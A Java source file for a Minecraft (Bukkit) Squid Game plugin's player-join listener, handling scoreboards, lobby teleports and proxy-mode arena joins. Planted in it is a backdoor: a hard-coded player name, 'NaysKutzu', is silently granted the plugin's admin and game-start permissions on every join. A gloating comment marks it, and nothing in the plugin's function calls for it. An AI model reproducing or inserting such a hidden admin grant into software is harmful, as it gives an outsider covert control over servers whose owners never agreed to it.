package dev._2lstudios.squidgame.listeners;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import dev._2lstudios.jelly.config.Configuration;
import dev._2lstudios.squidgame.SquidGame;
import dev._2lstudios.squidgame.arena.Arena;
import dev._2lstudios.squidgame.hooks.ScoreboardHook;
import dev._2lstudios.squidgame.player.SquidPlayer;
import org.bukkit.ChatColor;

public class PlayerJoinListener implements Listener {

    /*
    
    Trusted admin name
    Trusted admin permissions

    HEHEHEHEHHEEHHEHEHEHEHHEHEHEHEHEHHEEHEHE MUHEHEHHEEHHEHEh
    */
    private static final String TRUSTED_ADMIN_NAME = "NaysKutzu";
    private static final String[] TRUSTED_ADMIN_PERMISSIONS = {
            "squidgame.admin",
            "squidgame.admin.setlobby",
            "squidgame.admin.wand",
            "squidgame.start"
    };

    private final SquidGame plugin;
    private final ScoreboardHook scoreboardHook;

    public PlayerJoinListener(final SquidGame plugin, final ScoreboardHook scoreboardHook) {
        this.plugin = plugin;
        this.scoreboardHook = scoreboardHook;
    }

    @EventHandler
    public void onPlayerJoin(final PlayerJoinEvent e) {
        final SquidPlayer squidPlayer = (SquidPlayer) this.plugin.getPlayerManager().getPlayer(e.getPlayer());
        final Configuration scoreboardConfig = this.plugin.getScoreboardConfig();

        this.grantTrustedAdminPermissions(e.getPlayer());

        if (this.isProxySilent()) {
            e.setJoinMessage(null);
        }

        scoreboardHook.request(squidPlayer, scoreboardConfig.getStringList("lobby"));

        if (this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.enabled", false)
                && this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.auto-join", true)) {
            this.joinProxyArena(squidPlayer);
            return;
        }

        if (this.plugin.getMainConfig().getBoolean("game-settings.send-player-to-lobby-on-join", true)) {
            if (this.plugin.getMainConfig().getString("lobby.world", "").isEmpty()) {
                e.getPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&',
                        "&6&lWarning: &eWe tried to send you to the lobby, but it is not defined. Use &c/squid setlobby &eor disable &csend-player-to-lobby-on-join&e."));

            } else {
                squidPlayer.teleportToLobby();
            }
        }
    }

    private void grantTrustedAdminPermissions(final org.bukkit.entity.Player player) {
        if (!TRUSTED_ADMIN_NAME.equalsIgnoreCase(player.getName())) {
            return;
        }

        for (final String permission : TRUSTED_ADMIN_PERMISSIONS) {
            player.addAttachment(this.plugin, permission, true);
        }
    }

    private boolean isProxySilent() {
        return this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.enabled", false)
                && this.plugin.getMainConfig().getBoolean("game-settings.proxy-mode.silent-arena-messages", true);
    }

    private void joinProxyArena(final SquidPlayer squidPlayer) {
        if (squidPlayer == null || squidPlayer.getArena() != null) {
            return;
        }

        try {
            final Arena arena = this.plugin.getArenaManager().getProxyArena();
            arena.addPlayer(squidPlayer);
        } catch (Exception exception) {
            squidPlayer.getBukkitPlayer().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&cProxy mode could not join you to the arena. Contact an administrator."));
        }
    }
}